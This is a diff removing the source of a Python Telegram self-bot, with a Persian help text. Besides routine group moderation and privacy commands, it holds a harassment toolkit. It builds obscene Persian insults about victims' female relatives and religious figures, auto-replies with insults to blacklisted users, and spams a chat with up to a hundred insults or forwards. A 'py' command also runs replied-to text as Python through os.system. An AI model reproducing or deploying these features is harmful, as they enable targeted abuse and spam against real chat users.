@@ -1,1505 +1,1290 @@
-from pyrogram import Client, Filters, MessageHandler
-from pyrogram.api import functions, types
-import redis, random, time, os, requests, configparser, re
-import jdatetime
-
-#BY arad
-#Version 1.1
-#in the name of "mame"
-
-
-
-config = configparser.ConfigParser()
-config.read("config.ini")
-c = config["arad"]
-r = redis.StrictRedis(decode_responses=True)
-
-
-#Do Not Fucking touch this shits
-#isshhconnect = False # Just for Jss
-#sshc = None # //
-app = Client(c["SEASION_NAME"],int(c["API_ID"]),c["API_HASH"])
-helptext = """
-> l 
->> forward, link
-قفل لینک یا فوروارد
-l link
-
-> m 
->> photo ,sticker, text, voice, gif
-قفل فرد حتی در پیوی با ریپلای 
-m text
-
-> addf
->> fosh
-افزودن فحش
-addf ممه
-
-> list
->> help
-راهنمای لیست ها
-list help
-
-> pin
-پین کردن با ریپلای
-
-> ck
-سیک کردن افراد با ریپلای 
-
-> clearf
-پاک کردن فحش ها
-> clearb
-پاک کردن بلک لیست
-
-> reload
-کصنمک بازی در اوردن جلوی بقیه
-
-> d
-حذف
-
-> fuck it
-نمودن طرف با ریپلی 
-> del fuck
-حذف طرف از بلک لیست با ریپلای
-
-> py
-ران کردن اسکریپت پایتون با ریپلای 
-بلد نیستی دس نزن
-
-> p
->> bitcoin, bitcoin-cash , ...
-قیمت تمام ارزای مجاری
-p bitcoin
-
-> id
-بدست اوردن ایدی عددی هرچیزی با ریپلای
-
-> server
-مقدار استفاده شده از سرور
-
-> action
-فعال و غیرفعال کردن اکشن در چت ها
-همون تایپینگ پلینگ و غیره
-
-> action 
->> all, users, off, clear, list
-قعال کردن در همه یا گروه یا پیوی ها
-پاکسازی ایدی هایی ک در انجا فعال است
-
-> settings
-تنظیمات
-
-> setaction
->> PLAYING,...
-اگه نمیدونی چیه اینو بزن
-Actionlist
-
-> spamf
->> 1 ela 100
-فوش دادن به طرف با ریپلی کردن روش
-توجه کن اگه فوش ساز روشن باشه فوشایی ک اضافه کردید رو نمیفرسته
-
-> spam
->> 1 ela 100
-اسپم کردن چیزی با فورواردش 
-
-> Nobody
-ست کردن وضعیت انلاینی شما روی Nobody can see
-
-> Everybody
-ست کردن وضعیت انلاینی شما روی everybody can see
-
-> filterf
-روشن کردن فیلتر کردن فحشا
-مخصوص گروهایی ک فحش قفله توش
-
-> fmaker
-روشن و خاموش کردن فحش ساز 
-روشن باشه خودش رندوم فوش میده
-فحش یا فوش بکیرم ک اشتبا نوشتم
-
-> seen
-سین خودکار گپایی ک توشون این رو فرستادید 
-
-> seen 
->> group, pv, channel
-سین خودکار گپ یا پیوی و چنل ها
-
-> unmark 
->> id ya hichi
-سین نزدن این چت ها مخصوص وقتی ک گذاشتید همرو سین بزنه
-
-@WebinoSource
-"""
-
-def me(app):
-    my = app.get_me()
-    uid = my.id
-    return uid
-
-
-def admins(app,message):
-    chatid = message.chat.id
-    nn = app.get_chat_members(chatid,filter="administrators").chat_members
-    admin = [i.user.id for i in nn]
-    return admin
-
-
-if not r.get("autodeltime"): r.set("autodeltime", "10")
-
-
-#######BOSS MODE#######
-#Deleted
-######################
-
-
-###MAKE FOUSH###
-four = [
-    "تو",
-    "وسط",
-    "لا",
-    "داخل",
-    "رو",
-]
-
-three = [
-    "ننت",
-    "خالت",
-    "مادرت",
-    "نانات",
-    "مامانت",
-    "خواهرت",
-    "خارت",
-    "ننه جندت",
-    "خار جندت",
-    "خاله جندت",
-    "مادر جندت",
-
-]
-two = [
-    "کص",
-    "مهبل",
-    "سولاخ",
-    "کث",
-    "ممه",
-    "کون",
-    "صورت",
-    "گوش",
-    "ناف",
-    "گردن",
-    "کتف",
-    "رون",
-    "لاپا",
-    "کبص",
-    "کوبص",
-    "چشم",
-    
-]
-one = [
-    "کیرم",
-    "کیر خلیل",
-    "دسته مبل",
-    "ایفون صوتی با سیم",
-    "گوشیم",
-    "بزرکترین برج هاای جهان به ترتیب",
-    "کیر امام اخر",
-    "کیر امام خلیل",
-    "کیر خمینی",
-    "کیر عظیم حضرت جیزز",
-    "کیر امام جیزز",
-    "هایپ ایرانی",
-    "هایپ خارجی",
-    "قاب سیلی کونی",
-    "چاقو میوه خوری",
-    "جیتوز",
-    "تصمیم کبری",
-    "تصمیم خلیل",
-    "کیر حلزون",
-    "کیر فیل",
-    "کیر خر",
-    "کیر زرافه",
-    "خرتوم فیل",
-    "جفت پاهای جلوی فیل",
-    "کص ننت",
-    "کفشم",
-    "سشوار",
-    "کیر پلاستیکی",
-    "ظروف یکبار مصرف",
-    "سیب",
-    "خیار",
-    "دوتا موز",
-    "سه تا موز",
-    "چهارتا موز",
-    "کیر اسب ابی",
-    "کیر میمون",
-    "کیر خلیل پلاستیکی",
-
-]
-
-imoji = [
-    "😂😂😂",
-    " ",
-    " ",
-    "😂😂",
-    " ",
-    "😂",
-    "🤡",
-
-]
-
-
-def makef():
-    o1 = random.choice(one)
-    o2 = random.choice(two)
-    o3 = random.choice(three)
-    o4 = random.choice(imoji)
-    o5 = random.choice(four)
-    text1 = f"{o1} {o5} {o2} {o3} {o4}"
-    return text1
-
-
-locks = [
-    "link",
-    "forward",
-]
-
-mutes = [
-    "text",
-    "photo",
-    "sticker",
-    "gif",
-    "voice",
-]
-
-
-
-
-def mark(app, message):
-    dialog_peer = app.resolve_peer(message.chat.id)
-    try:
-        app.send(functions.channels.ReadHistory(dialog_peer, 0))
-    except:
-        app.send(functions.messages.ReadHistory(dialog_peer, 0))
-
-
-
-@app.on_message(Filters.regex("^[Ll] (.*)$") & Filters.group , group=-20)
-def jss_lock(client, message):
-    lock = message.text.split(" ")[1]
-    chatid = message.chat.id
-    userid = message.from_user.id
-    if userid != me(app):return
-    if lock not in locks:return
-    if str(chatid) in r.smembers("lock"+lock):
-        r.srem("lock"+lock,str(chatid))
-        text = f"`{lock}` __UNlocked__ JSS!"
-    else:
-        r.sadd("lock"+lock,str(chatid))
-        text = f"`{lock}` __Locked__ JSS!"
-
-    send = app.edit_message_text(chatid, message.message_id, text)
-    if r.get("autodel") == "on":
-            time.sleep(float(r.get("autodeltime")))
-            app.delete_messages(message.chat.id,[send.message_id])
-
-
-# Input Link
-@app.on_message(Filters.regex(r"[Hh][Tt][Tt][Pp]|[tT].[Mm][Ee]|[Ww][Ww][Ww]|\.[Mm][Ee]") & Filters.group , group=-21)
-def jss_link(client, message):
-    chatid = message.chat.id
-    userid = message.from_user.id
-    if int(userid) in admins(app,message): return
-    if str(chatid) not in r.smembers(f"locklink"):return
-    app.delete_messages(chatid,[message.message_id])
-
-
-# Input Forward
-@app.on_message(Filters.forwarded & Filters.group, group=-22)
-def jss_forawrd(client, message):
-    chatid = message.chat.id
-    userid = message.from_user.id
-    if int(userid) in admins(app,message): return
-    if str(chatid) not in r.smembers(f"lockforward"):return
-    app.delete_messages(chatid,[message.message_id])
-
-
-
-@app.on_message(Filters.reply & Filters.regex("^[Mm] (.*)$"))
-def jss_reply(client, message):
-    m = message.text.split(" ")[1]
-    fname = message.reply_to_message.from_user.first_name
-    userid = message.reply_to_message.from_user.id
-    myid = message.from_user.id
-    if myid != me(app):return
-    if m not in mutes:return
-    if str(userid) == str(547038341):return
-    if str(userid) in r.smembers("mute"+m):
-            r.srem("mute"+m,str(userid))
-            text = f"`{m}` __UNmuted__ for **{fname}**\nBy JSS!"
-    else:
-        r.sadd("mute"+m,str(userid))
-        text = f"`{m}` __Muted__ for **{fname}**\nBy JSS!"
-
-    send =app.edit_message_text(message.chat.id,message.message_id,text)
-    if r.get("autodel") == "on":
-            time.sleep(float(r.get("autodeltime")))
-            app.delete_messages(message.chat.id,[send.message_id])
-
-
-def filterfosh(f):
-    if "کص" in f:
-        f = f.replace("کص", "ک.ص")
-    if "خار" in f:
-        f = f.replace("خار", "خ.ار")
-    if "کس" in f:
-        f = f.replace("کس", "ک.س")
-    if "کیر" in f:
-        f = f.replace("کیر", "ک.یر")
-    if "ننت" in f:
-        f = f.replace("ننت", "ن.نت")
-    if "جنده" in f:
-        f = f.replace("جنده", "ج.نده")
-    if "سیک" in f:
-        f = f.replace("سیک", "س.یک")
-    if "تخم" in f:
-        f = f.replace("تخم", "ت.خم")
-    if "ممه" in f:
-        f = f.replace("ممه", "ممع")
-    if "مادر" in f:
-        f = f.replace("مادر", "م.ادر")
-    return f
-    
-@app.on_message(Filters.text & Filters.group)
-def jss_text(client, message):
-    chatid = message.chat.id
-    userid = message.from_user.id
-    if str(userid) in r.smembers("mutetext"):
-        app.delete_messages(chatid,[message.message_id])
-    if str(userid) in r.smembers("blacklist"):
-        fosh = random.choice(list(r.smembers("fosh")))
-        if r.get("fmaker") == "on":
-            fosh = makef()
-        if r.get("filterfosh") == "on": fosh = filterfosh(fosh)
-        app.send_message(chatid,fosh, reply_to_message_id=message.message_id)
-
-
-@app.on_message(Filters.text & Filters.private, group=-23)
-def jss_text_priv(client, message):
-    chatid = message.chat.id
-    userid = message.from_user.id
-    if str(userid) in r.smembers("mutetext"):
-        app.delete_messages(chatid,[message.message_id])
-    if str(userid) in r.smembers("blacklist"):
-        fosh = random.choice(list(r.smembers("fosh")))
-        if r.get("fmaker") == "on":
-            fosh = makef()
-        if r.get("filterfosh") == "on": fosh = filterfosh(fosh)
-        app.send_message(chatid,fosh, reply_to_message_id=message.message_id)
-
-
-@app.on_message(Filters.text & Filters.me, group=-2)
-def jss_text_me(client, message):
-    rmsg = None
-    text = message.text
-
-    if text in r.hgetall("cards"):
-        txt = r.hgetall("cards")[text]
-        send = app.edit_message_text(message.chat.id, message.message_id, txt)
-        if r.get("autodel") == "on":
-            time.sleep(float(r.get("autodeltime")))
-            app.delete_messages(message.chat.id,[send.message_id])
-    elif text in r.hgetall("qanswer"):
-        txt = r.hgetall("qanswer")[text]
-        t = txt.split(":")
-        if message.reply_to_message:
-            rmsg = message.reply_to_message.message_id
-
-        if t[0] == "GIF":
-            #sendgif
-            app.send_animation(message.chat.id,t[1], reply_to_message_id=rmsg)
-        elif t[0] == "STICKER":
-            app.send_sticker(message.chat.id, t[1], reply_to_message_id=rmsg)
-
-        elif t[0] == "VN":
-            app.send_video_note(message.chat.id, t[1], reply_to_message_id=rmsg)
-
-        elif t[0] == "VOICE":
-            app.send_voice(message.chat.id, t[1], reply_to_message_id=rmsg)
-
-        elif t[0] == "VIDEO":
-            app.send_video(message.chat.id, t[1], reply_to_message_id=rmsg)
-
-        elif t[0] == "DOC":
-            app.send_document(message.chat.id, t[1], reply_to_message_id=rmsg)
-
-        elif t[0] == "PHOTO":
-            app.send_photo(message.chat.id, t[1], reply_to_message_id=rmsg)
-
-        app.delete_messages(message.chat.id, [message.message_id])
-    
-    else:return
-
-
-
-@app.on_message(Filters.regex("^[Aa]ddf (.*)"), group=6)
-def jss_addfo(client,message):
-    _ = message.text.split(" ")[0]
-    fo = message.text.replace(_,"")
-    r.sadd("fosh",fo)
-    myid = message.from_user.id
-    if myid != me(app):return
-    text = f"`ADD shd`"
-    app.delete_messages(message.chat.id,[message.message_id])
-
-
-
-@app.on_message(Filters.regex("[Dd]elf (.*)"), group=4)
-def jss_delfo(client, message):
-    _ = message.text.split(" ")[0]
-    fo = message.text.replace(_,"")
-    r.srem("fosh",fo)
-    myid = message.from_user.id
-    if myid != me(app):return
-    text = f"`Del shd`"
-    app.delete_messages(message.chat.id,[message.message_id])
-
-
-
-#@app.on_message(Filters.regex("[Ll]istf"), group=5)
-def l_listf(message):
-    fl = r.smembers("fosh")
-    text = ""
-    count = 1
-    for i in fl:
-        text = text + f"{count} - `{i}`\n"
-        count+=1
-    send =app.edit_message_text(message.chat.id,message.message_id,text)
-    if r.get("autodel") == "on":
-            time.sleep(float(r.get("autodeltime")))
-            app.delete_messages(message.chat.id,[send.message_id])
-
-
-
-@app.on_message(Filters.regex("(\d*) ta (\d*) (.*)"), group=3)
-def jss_count(client, message):
-    from_ = message.text.split(" ")[0]
-    n = message.text.split(" ")[2]
-    text = message.text
-    count = f"{from_} ta {n} "
-    text = text.replace(count, "")
-    myid = message.from_user.id
-    if myid != me(app):return
-    for i in range(int(from_),int(n)):
-        app.send_message(message.chat.id,str(i))
-    app.send_message(message.chat.id,str(text))
-
-
-
-@app.on_message(Filters.animation & (Filters.group | Filters.private), group=-5)
-def jss_gif(client, message):
-    chatid = message.chat.id
-    userid = message.from_user.id
-    if str(userid) not in r.smembers("mutegif"):return
-    app.delete_messages(chatid,[message.message_id])
-
-
-@app.on_message(Filters.voice & (Filters.group | Filters.private), group=-6)
-def jss_voice(client, message):
-    chatid = message.chat.id
-    userid = message.from_user.id
-    if str(userid) not in r.smembers("mutevoice"):return
-    app.delete_messages(chatid,[message.message_id])
-
-
-@app.on_message(Filters.photo & (Filters.group | Filters.private), group=-7)
-def jss_photo(client, message):
-    chatid = message.chat.id
-    userid = message.from_user.id
-    if str(userid) not in r.smembers("mutephoto"):return
-    app.delete_messages(chatid,[message.message_id])
-
-
-
-@app.on_message(Filters.sticker & (Filters.group | Filters.private), group=-8)
-def jss_sticker(client, message):
-    chatid = message.chat.id
-    userid = message.from_user.id
-    if str(userid) not in r.smembers(f"mutesticker"):return
-    app.delete_messages(chatid,[message.message_id])
-
-
-
-
-
-@app.on_message(Filters.group & Filters.reply & Filters.regex("^([Cc]k)$"), group=2)
-def jss_ck(client,message):
-    myid = message.from_user.id
-    if myid != me(app):return
-    userid = message.reply_to_message.from_user.id
-    fname = message.reply_to_message.from_user.first_name
-    app.kick_chat_member(message.chat.id,userid)
-    text = f"**{fname}** __Cked__ ;)"
-    send =app.edit_message_text(message.chat.id,message.message_id,text)
-    if r.get("autodel") == "on":
-            time.sleep(float(r.get("autodeltime")))
-            app.delete_messages(message.chat.id,[send.message_id])
-
-
-@app.on_message(Filters.group & Filters.reply & Filters.regex("^[Pp]in$") , group=1)
-def jss_pin(client,message):
-    myid = message.from_user.id
-    if myid != me(app):return
-    msgid = message.reply_to_message.message_id
-    app.pin_chat_message(message.chat.id,msgid )
-    text = f"**Pin** __Shd__ ;)"
-    send =app.edit_message_text(message.chat.id,message.message_id,text)
-    if r.get("autodel") == "on":
-            time.sleep(float(r.get("autodeltime")))
-            app.delete_messages(message.chat.id,[send.message_id])
-    
-reloadl = [
-    "`start reloading`",
-    "░░░░░░░░░░░░░░",
-    "▓░░░░░░░░░░░░░",
-    "▓▓░░░░░░░░░░░░",
-    "▓▓▓░░░░░░░░░░░",
-    "▓▓▓▓░░░░░░░░░░",
-    "▓▓▓▓▓░░░░░░░░░",
-    "▓▓▓▓▓▓░░░░░░░░",
-    "▓▓▓▓▓▓▓░░░░░░░",
-    "▓▓▓▓▓▓▓▓░░░░░░",
-    "▓▓▓▓▓▓▓▓▓░░░░░",
-    "▓▓▓▓▓▓▓▓▓▓░░░░",
-    "▓▓▓▓▓▓▓▓▓▓▓░░░",
-    "▓▓▓▓▓▓▓▓▓▓▓▓░░",
-    "▓▓▓▓▓▓▓▓▓▓▓▓▓░",
-    "▓▓▓▓▓▓▓▓▓▓▓▓▓▓",
-    "reloading.",
-    "reloading..",
-    "reloading...",
-    "reloading.",
-    "reloading..",
-    "reloading...",
-    "reloading.",
-    "reloading..",
-    "reloading...",
-    "`reloaded! :)`",
-]
-
-#Just For Fun :)
-@app.on_message((Filters.group|Filters.private) & Filters.regex("^[Rr]eload$") , group=1)
-def jss_reload(client,message):
-    myid = message.from_user.id
-    if myid != me(app):return
-    for i in reloadl:
-        time.sleep(0.2)
-        send =app.edit_message_text(message.chat.id,message.message_id,i)
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-
-@app.on_message(Filters.regex("^[Ff]uck it$") & Filters.reply , group=1)
-def jss_addblacklist(client,message):
-    myid = message.from_user.id
-    userid = message.reply_to_message.from_user.id
-    if myid != me(app):return
-    r.sadd("blacklist",str(userid))
-    app.delete_messages(message.chat.id,[message.message_id])
-
-
-
-
-@app.on_message(Filters.regex("^[Dd]el fuck$") & Filters.reply , group=7)
-def jss_delblacklist(client,message):
-    myid = message.from_user.id
-    userid = message.reply_to_message.from_user.id
-    if myid != me(app):return
-    r.srem("blacklist",str(userid))
-    app.delete_messages(message.chat.id,[message.message_id])
-
-
-
-@app.on_message(Filters.regex("^[Pp]y$") & Filters.reply , group=8)
-def jss_runpy(client,message):
-    myid = message.from_user.id
-    text = message.reply_to_message.text
-    if myid != me(app):return
-    with open("script.py", "a+") as f_w:
-        f_w.write(text)
-    os.system("python3 script.py > out.txt")
-    with open("out.txt", "r") as f_r:
-        out = f_r.read()
-        out = "Output:\n" + out
-    os.remove("script.py")
-    os.remove("out.txt")
-    send =app.edit_message_text(message.chat.id,message.message_id,out)
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-@app.on_message(Filters.regex("^[Dd]$"),group=9)
-def jss_delete(client,message):
-    myid = message.from_user.id
-    if myid != me(app):return
-    msgid = message.reply_to_message.message_id
-    mymsg = message.message_id
-    app.delete_messages(message.chat.id, [msgid,mymsg])
-
-
-
-@app.on_message(Filters.regex("^[Cc]learb$") , group=10)
-def jss_clearf(client,message):
-    myid = message.from_user.id
-    if myid != me(app):return
-    r.delete("blacklist")
-    send =app.edit_message_text(message.chat.id,message.message_id,"`Blacklist` is Clear Now")
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-@app.on_message(Filters.regex("^([Ii]d)$") , group=11)
-def jss_myid(client,message):
-    myid = message.from_user.id
-    if myid != me(app):return
-    if "reply_to_message" in str(message):
-        if message.reply_to_message.forward_from_chat:
-            uid = message.reply_to_message.forward_from_chat.id
-        else:
-            uid = message.reply_to_message.from_user.id
-    else:
-        uid = message.chat.id
-    send =app.edit_message_text(message.chat.id,message.message_id,f"`{uid}`")
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-@app.on_message(Filters.regex("^([Pp]) (.*)$") , group=12)
-def jss_myid(client,message):
-    myid = message.from_user.id
-    if myid != me(app):return
-    name = message.text.split(" ")[1]
-    url = requests.get(f"https://api.coinmarketcap.com/v1/ticker/{name}/")
-    change1h = url.json()[0]["percent_change_1h"]
-    change24h = url.json()[0]["percent_change_24h"]
-    change7d = url.json()[0]["percent_change_7d"]
-    price = url.json()[0]["price_usd"]
-    send =app.edit_message_text(text="**-{}-** \n__Price__ : `${}`\n__Change 1h__ : `{}%`\n__Change 24h__ : `{}%`\n__Change 7d__ : `{}%`".format(name,price,change1h,change24h,change7d),
-        chat_id=message.chat.id,
-        message_id=message.message_id,)
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-
-@app.on_message(Filters.regex("^([Nn]obody|[Ee]verybody)$") & Filters.me , group=15)
-def jss_setprivacy(client,message):
-    if  "obody" in str(message.text):
-        app.send(
-            functions.account.SetPrivacy(
-                key=types.InputPrivacyKeyStatusTimestamp(),
-                rules=[types.InputPrivacyValueDisallowAll()]
-            )
-        )
-        send =app.edit_message_text(text="Now Nobody Can See your Last seen!",
-            chat_id=message.chat.id,
-            message_id=message.message_id,)
-        r.set("lastseen", "NoBody")
-        if r.get("autodel") == "on":
-            time.sleep(float(r.get("autodeltime")))
-            app.delete_messages(message.chat.id,[send.message_id])
-
-
-    else:
-        app.send(
-            functions.account.SetPrivacy(
-                key=types.InputPrivacyKeyStatusTimestamp(),
-                rules=[types.InputPrivacyValueAllowAll()]
-            )
-        )
-
-        send =app.edit_message_text(text="Now Everybody Can See your Last seen!",
-            chat_id=message.chat.id,
-            message_id=message.message_id,)
-        r.set("lastseen", "EveryBody")
-        if r.get("autodel") == "on":
-            time.sleep(float(r.get("autodeltime")))
-            app.delete_messages(message.chat.id,[send.message_id])
-
-
-
-
-@app.on_message(Filters.regex("^[Ss]pam (\d*)$") & Filters.reply , group=16)
-def jss_spam(client,message):
-    myid = message.from_user.id
-    msgid = message.reply_to_message.message_id
-    chatid = message.chat.id
-    spam = int(message.text.split(" ")[1])
-    if myid != me(app):return
-    for i in range(spam):
-        app.forward_messages(
-            chat_id=chatid,
-            from_chat_id=chatid,
-            message_ids=[msgid]
-        )
-    app.delete_messages(message.chat.id,[message.message_id])
-
-
-@app.on_message(Filters.regex("^[Ss]pamf (\d*)$") & Filters.reply & Filters.me , group=17)
-def jss_spamf(client,message):
-    msgid = message.reply_to_message.message_id
-    chatid = message.chat.id
-    spam = int(message.text.split(" ")[1])
-    foshes = list(r.smembers("fosh"))
-    for i in range(spam):
-        fosh = random.choice(foshes)
-        if r.get("fmaker") == "on":
-            fosh = makef()
-        app.send_message(chatid,fosh, reply_to_message_id=msgid)
-    app.delete_messages(message.chat.id,[message.message_id])
-
-
-@app.on_message(Filters.regex("^[Aa]ction$") & Filters.me, group=18)
-def jss_action(client,message):
-    chatid = message.chat.id
-    if str(chatid) in r.smembers("chataction"):
-        r.srem("chataction", str(chatid))
-        text = "ChatAction in This Chat is OFF now"
-    else:
-        r.sadd("chataction", str(chatid))
-        text = "ChatAction in This Chat is ON now"
-
-    send = app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-
-def jss_incoming(message):
-    action = r.get("action") or "PLAYING"
-    chatid = message.chat.id
-    mode = r.get("actionmode") or "users"
-    if str(chatid) in r.smembers("chataction"):
-        for i in range(3):
-            app.send_chat_action(
-                chatid, 
-                action
-            )
-        return
-    if mode == "all" :
-        for i in range(3):
-            app.send_chat_action(
-            chatid, 
-            action
-            )
-        return
-    if mode == "off":return
-    if mode == "users":
-        if str(chatid) in r.smembers("chataction"):
-            for i in range(3):
-                app.send_chat_action(
-                    chatid, 
-                    action
-                )
-        return
-    else:
-        if str(chatid) in r.smembers("chataction"):
-            for i in range(3):
-                app.send_chat_action(
-                    chatid, 
-                    action
-                )
-        return
-
-    
-
-@app.on_message(Filters.regex("^[Ss]etaction (.*)$") & Filters.me , group=19)
-def jss_setaction(client,message):
-    action = str(message.text.split(" ")[1])
-    r.set("action", action)
-    send =app.edit_message_text(text=f"Action Seted to {action}",
-            chat_id=message.chat.id,
-            message_id=message.message_id,)
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-@app.on_message(Filters.regex("^[Aa]ctionlist$") & Filters.me , group=20)
-def jss_actionlist(client,message):
-    text = """
-actions:
-
-`CANCEL`
-`TYPING`
-`PLAYING`
-`CHOOSE_CONTACT`
-`UPLOAD_PHOTO`
-`RECORD_VIDEO`
-`RECORD_AUDIO`
-`UPLOAD_VIDEO`
-`UPLOAD_AUDIO`
-`UPLOAD_DOCUMENT`
-`FIND_LOCATION`
-`RECORD_VIDEO_NOTE`
-`UPLOAD_VIDEO_NOTE`
-
-cmd:
-
-Setaction [action]
-"""
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-@app.on_message(Filters.regex("^[sS]ettings$") & Filters.me , group=21)
-def jss_settings(client,message):
-    global password
-    password = password[0] + "*" * (len(password) - 2) + password[-1]
-    chatid = message.chat.id
-    text = f"""
-JSettings:
-
-**ChatAction:** `{r.get("action") or "PLAYING"}`
-┣ Mode: `{r.get("actionmode")}`
-**AntiSpamMode**: `ON`
-┣ ifSpam: `BLOCK`
-**Password:** Just Jss
-**Boss:** Just Jss
-**LastSeen:** `{r.get("lastseen")}`
-**FilterFosh:** `{r.get("filterfosh")}`
-**FoshMaker:** `{r.get("fmaker")}`
-**AutoDel:** `{r.get("autodel")}`
-┣ Time: {r.get("autodeltime")}
-**AutoSeen:** `{r.get("autoseen")}`
-┣ Mode: `{",".join([i for i in r.smembers("seen:mode")])}`
-┣ ThisChatinUnmarks? `{"YES" if str(chatid) in r.smembers("unmark") else "NO"}`
-**ServerSet:** Just Jss
-┣ IP: 
-┣ PASS: 
-"""
-    send =app.edit_message_text(text=text,
-            chat_id=message.chat.id,
-            message_id=message.message_id,)
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-
-#Added To list
-#@app.on_message(Filters.regex("^[Bb]lacklist$") & Filters.me , group=22)
-def l_blacklist(message):
-    blist = r.smembers("blacklist")
-    text = "BlackList:\n"
-    count = 1
-    for i in blist:
-        text = text + f"{count} - [{i}](tg://user?id={i})\n"
-        count+=1
-    send =app.edit_message_text(message.chat.id,message.message_id,text)
-    if r.get("autodel") == "on":
-            time.sleep(float(r.get("autodeltime")))
-            app.delete_messages(message.chat.id,[send.message_id])
-
-
-def l_action(message):
-    actionchats = r.smembers("chataction")
-    text = "ActionChats:\n\n"
-    count = 1
-    for i in actionchats:
-        text = text + f"{count} - [{i}](tg://user?id={i})\n"
-        count+=1
-    send =app.edit_message_text(text=text,
-                chat_id=message.chat.id,
-                message_id=message.message_id,)
-    
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-    return
-
-@app.on_message(Filters.regex("^[Aa]ction (.*)$") & Filters.me, group=23)
-def jss_actionmode(client,message):
-    chatid = message.chat.id
-    mode = str(message.text.split(" ")[1])
-    if mode == "off":r.set("actionmode", mode)
-    elif mode == "all":r.set("actionmode", mode)
-    elif mode == "users":r.set("actionmode", mode)
-
-    elif mode == "clear":
-        r.delete("chataction")
-        send =app.edit_message_text(text="ActionChats Is Clear Now!",
-                    chat_id=message.chat.id,
-                    message_id=message.message_id,)
-        
-        if r.get("autodel") == "on":
-            time.sleep(float(r.get("autodeltime")))
-            app.delete_messages(message.chat.id,[send.message_id])
-        return
-    send =app.edit_message_text(text=f"ActionMode Seted to {mode}",
-                    chat_id=message.chat.id,
-                    message_id=message.message_id,)
-    
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-    return
-
-
-
-@app.on_message(Filters.regex("^[Cc]learf$") & Filters.me, group=24)
-def jss_clearf(client,message):
-    r.delete("fosh")
-    send =app.edit_message_text(message.chat.id,message.message_id,"foshList Deleted!")
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-@app.on_message(Filters.regex("^[Ff]ilterf$") & Filters.me, group=25)
-def jss_foshfiltere(client,message):
-    f = r.get("filterfosh")
-    if f == "on":
-        r.set("filterfosh", "off")
-        text = "off"
-    else:
-        r.set("filterfosh", "on")
-        text = "on"
-    send =app.edit_message_text(message.chat.id,message.message_id,f"filterf {text} shod")
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-@app.on_message(Filters.regex("^[hH]elp$") & Filters.me, group=26)
-def jss_clearf(client,message):
-    send =app.edit_message_text(message.chat.id,message.message_id,helptext)
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-@app.on_message(Filters.regex("^[Ss]et (.*)$") & Filters.me , group=30)
-def jss_setcmd(client, message):
-    cmd = message.text.split(" ")[1]
-    rmsg = message.reply_to_message
-    if rmsg.sticker:
-        fid = "STICKER:"+str(rmsg.sticker.file_id)
-        r.hmset("qanswer", {cmd: fid})
-    elif rmsg.animation:
-        fid = "GIF:"+str(rmsg.animation.file_id)
-        r.hmset("qanswer", {cmd: fid})
-    elif rmsg.photo:
-        fid = "PHOTO:"+str(rmsg.photo.sizes[-1].file_id)
-        r.hmset("qanswer", {cmd: fid})
-    elif rmsg.video:
-        fid = "VIDEO:"+str(rmsg.video.file_id)
-        r.hmset("qanswer", {cmd: fid})
-    elif rmsg.document:
-        fid = "DOC:"+str(rmsg.document.file_id)
-        r.hmset("qanswer", {cmd: fid})
-    elif  rmsg.video_note:
-        fid = "VN:"+str(rmsg.video_note.file_id)
-        r.hmset("qanswer", {cmd: fid})
-    elif rmsg.voice:
-        fid = "VOICE:"+str(rmsg.voice.file_id)
-        r.hmset("qanswer", {cmd: fid})
-    else:return
-    send =app.edit_message_text(message.chat.id,message.message_id,f"Done, {cmd} Seted!")
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id, [send.message_id])
-        
-
-
-@app.on_message(Filters.regex("^[Dd]cmd (.*)$") & Filters.me , group=32)
-def jss_delcmd(client,message):
-    cmd = message.text.split(" ")[1]
-    r.hdel("qanswer", cmd)
-    send =app.edit_message_text(message.chat.id,message.message_id,f"Done, {cmd} Deleted!")
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
-
-@app.on_message(Filters.regex("^[Aa]utodel? ?(\d*)$") & Filters.me , group=33)
-def jss_autodel(client,message):
-    if " " in message.text:
-        timer = message.text.split(" ")[1]
-        r.set("autodeltime", timer)
-        text = f"AutoDelTime Seted to `{time}` Secend"
-    else:
-        if r.get("autodel") == "on":
-            r.set("autodel", "off")
-            text = "Auto Delete Is `OFF` Now"
-        else:
-            r.set("autodel", "on")
-            text = "Auto Delete Is `ON` Now"
-    
-    send =app.edit_message_text(message.chat.id,message.message_id,text)
-    if r.get("autodel") == "on":
-        time.sleep(float(r.get("autodeltime")))
-        app.delete_messages(message.chat.id,[send.message_id])
-
